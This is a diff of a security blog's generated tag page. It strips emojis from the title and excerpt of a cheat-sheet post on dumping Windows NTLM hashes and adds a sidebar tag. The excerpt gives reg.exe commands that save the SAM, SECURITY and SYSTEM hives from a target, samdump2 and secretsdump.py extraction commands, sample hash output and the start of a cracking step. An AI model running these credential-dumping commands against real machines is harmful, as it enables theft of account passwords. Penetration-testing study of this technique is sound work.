@@ -173,17 +173,17 @@
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">🗃️ Dumping NTLM Hashes via Non-Interactive Shell (Windows)
+    <h2 class="entry-hint-parent">Dumping NTLM Hashes via Non-Interactive Shell (Windows)
     </h2>
   </header>
   <div class="entry-content">
-    <p>Step 1: 💾 Save Registry Hives (SAM, SECURITY, SYSTEM) Run these commands on the target Windows machine:
-reg.exe save hklm\sam sam reg.exe save hklm\security security reg.exe save hklm\system system These commands save the SAM, SECURITY, and SYSTEM hives as files in the current directory. 📂 Copy these files to your attacker machine for offline cracking. 🔍 Step 2: Extract Hashes from Saved Files Two popular tools to extract NTLM hashes:
-Using samdump2: samdump2 ./system ./sam Using Impacket’s secretsdump.py: secretsdump.py -sam sam -system system LOCAL 📄 Sample Output Explained Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450::: 👤 Username (e.g., Administrator) 🆔 User RID/Group (e.g., 500) 🔐 LM hash (usually empty/disabled) 🗝️ NT hash (this is what you crack) 🛠️ Step 3: Crack NTLM Hashes Extract NT hashes (4th field) and save in hashes.txt:
+    <p>Step 1: Save Registry Hives (SAM, SECURITY, SYSTEM) Run these commands on the target Windows machine:
+reg.exe save hklm\sam sam reg.exe save hklm\security security reg.exe save hklm\system system These commands save the SAM, SECURITY, and SYSTEM hives as files in the current directory. 📂 Copy these files to your attacker machine for offline cracking. Step 2: Extract Hashes from Saved Files Two popular tools to extract NTLM hashes:
+Using samdump2: samdump2 ./system ./sam Using Impacket’s secretsdump.py: secretsdump.py -sam sam -system system LOCAL Sample Output Explained Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450::: 👤 Username (e.g., Administrator) 🆔 User RID/Group (e.g., 500) 🔐 LM hash (usually empty/disabled) 🗝️ NT hash (this is what you crack) 🛠️ Step 3: Crack NTLM Hashes Extract NT hashes (4th field) and save in hashes.txt:
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🗃️ Dumping NTLM Hashes via Non-Interactive Shell (Windows)" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/dumping_ntlm_hashes_via_non_interactive_shell_and__cracking_it_using_various_tools/"></a>
+  <a class="entry-link" aria-label="post link to Dumping NTLM Hashes via Non-Interactive Shell (Windows)" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/dumping_ntlm_hashes_via_non_interactive_shell_and__cracking_it_using_various_tools/"></a>
 </article>
           <div style="margin-top: auto">
             <div class="content-footer">
@@ -213,7 +213,9 @@ Using samdump2: samdump2 ./system ./sam Using Impacket’s secretsdump.py: secre
 
     <section>
         <h2>Trending Tags</h2>
-                                                                                                                                                                                    
+              
+        <a class="sidebar-tag" href="http://localhost:1313/tags/overthewire/"> OverTheWire </a>
+                                                                                                                                                                                                                                                            
         <a class="sidebar-tag" href="http://localhost:1313/tags/blog/"> Blog </a>
                                                                                                                                                                    
     </section>
